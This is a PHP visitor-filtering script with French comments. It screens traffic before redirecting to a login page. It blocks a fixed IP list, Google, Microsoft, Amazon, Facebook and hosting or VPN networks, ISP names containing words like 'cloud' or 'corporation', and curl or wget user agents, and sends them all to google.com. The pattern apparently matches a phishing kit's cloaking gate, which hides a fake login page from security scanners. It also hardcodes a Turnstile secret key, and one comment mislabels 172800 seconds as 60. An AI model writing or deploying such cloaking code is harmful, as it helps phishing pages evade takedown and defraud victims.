<?php
session_start();

/* ============================================================
   CONFIGURATION
============================================================ */
$config = [
    'redirect_url'         => './login.php',
    'blocked_redirect_url' => 'https://www.google.com',
    'ip_blocklist'         => [
        '52.143.164.69',
        '135.125.122.65',
        '40.89.180.243',
        '35.241.220.252',
        '4.178.174.59',
        '163.172.240.97',
        '40.89.180.146',
        '4.251.36.192',
        '4.178.174.69',
        '4.251.36.195'
    ],
    'blocked_isps' => [
        'Google LLC',
        'Amazon Technologies Inc.',
        'Microsoft Corporation',
        'OVH SAS',
        'Hetzner Online GmbH',
        'DigitalOcean, LLC',
        'Facebook, Inc.',
        'Choopa, LLC',
        'Alibaba (US) Technology Co., Ltd.'
    ],
    'blocked_isp_keywords' => [
        'cloud', 'server', 'hosting', 'data', 'vpn', 'colo', 'corporation'
    ],
    'allowed_countries' => ['CI', 'FR'],
    'log_blocked_ips' => true,
    'log_file' => __DIR__.'/blocked_ips.log'
];

/* ============================================================
   1. FONCTIONS DE SÉCURITÉ IP & ISP
============================================================ */
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'];
}

function isIpSuspicious($ip) {
    $bot_check = @file_get_contents("https://blackbox.ipinfo.app/lookup/$ip");
    if (trim($bot_check) === 'Y') return 'Bot detected via IPInfo';

    $score = @file_get_contents("http://check.getipintel.net/check.php?ip=$ip&contact=test@test.com&flags=m");
    if (is_numeric($score) && floatval($score) >= 0.98) return 'High risk score via GetIPIntel';

    $teoh_data = @file_get_contents("https://ip.teoh.io/api/vpn/$ip");
    $json = json_decode($teoh_data, true);
    if (!empty($json['vpn']) || !empty($json['proxy']) || !empty($json['tor'])) {
        if ($json['vpn'] === true || $json['proxy'] === true || $json['tor'] === true) {
            return 'VPN/Proxy detected via Teoh.io';
        }
    }
    return false;
}

/* ============================================================
   2. FILTRAGE IP, ISP & PAYS
============================================================ */
$visitor_ip = getClientIP();
$reason = false;

// Bypass pour localhost/développement local
$local_ips = ['127.0.0.1', '::1', 'localhost'];
$is_local = in_array($visitor_ip, $local_ips);

if (!$is_local) {
    if (in_array($visitor_ip, $config['ip_blocklist'])) {
        $reason = 'IP blocklisted';
    }

    if (!$reason) {
        $reason = isIpSuspicious($visitor_ip);
    }
}

if (!$is_local && !$reason) {
    $info = @file_get_contents("http://ip-api.com/json/{$visitor_ip}?fields=countryCode,isp");
    if ($info) {
        $infoData = json_decode($info, true);
        $isp = strtolower($infoData['isp'] ?? '');
        $country = strtoupper($infoData['countryCode'] ?? '');

        if (false && !in_array($country, $config['allowed_countries'])) {
            $reason = "Country not allowed: $country";
        } elseif (in_array(ucwords($isp), $config['blocked_isps'])) {
            $reason = "Blocked ISP: $isp";
        } else {
            foreach ($config['blocked_isp_keywords'] as $keyword) {
                if (strpos($isp, strtolower($keyword)) !== false) {
                    $reason = "ISP contains keyword: $keyword";
                    break;
                }
            }
        }
    }
}

if ($reason) {
    if ($config['log_blocked_ips']) {
        $log_message = date('Y-m-d H:i:s') . " - IP bloquée: $visitor_ip - Raison: $reason\n";
        file_put_contents($config['log_file'], $log_message, FILE_APPEND);
    }
    header("Location: {$config['blocked_redirect_url']}");
    exit();
}

/* ============================================================
   3. AUTRES FILTRES ANTI-BOTS
============================================================ */

// Honeypot
if (!empty($_POST['honeypot'])) {
    die("🚫 Accès interdit : bot détecté.");
}

// Vérification soumission trop rapide
if (isset($_POST['timestamp']) && (time() - $_POST['timestamp'] < 3)) {
    die("🚫 Accès refusé : soumission trop rapide.");
}

// User-Agent suspects
$suspicious_agents = ["curl", "wget", "bot", "spider", "crawler", "scraper"];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
foreach ($suspicious_agents as $agent) {
    if (stripos($user_agent, $agent) !== false) {
        die("🚫 Accès interdit : User-Agent suspect détecté.");
    }
}

// Rate limiting
$limit = 10;
$duration = 172800; // 60 secondes
if (!isset($_SESSION['requests'])) $_SESSION['requests'] = [];
$_SESSION['requests'] = array_filter($_SESSION['requests'], fn($t) => $t > time() - $duration);
$_SESSION['requests'][] = time();
if (count($_SESSION['requests']) > $limit) {
    die("🚫 Trop de requêtes détectées, réessayez plus tard.");
}

// Cloudflare Turnstile
$turnstile_secret = "0x4AAAAAABRI8mF7srmsijRVL-AQnCBnNy0";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = $_POST["cf-turnstile-response"] ?? "";
    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        "secret" => $turnstile_secret,
        "response" => $token,
        "remoteip" => $visitor_ip
    ]);
    $response = json_decode(curl_exec($ch), true);
    curl_close($ch);
    if (!$response["success"]) {
        die("🚫 Accès refusé : échec de la vérification anti-bot.");
    }
}

/* ============================================================
   4. REDIRECTION SI OK
============================================================ */
header("Location: {$config['redirect_url']}");
exit();
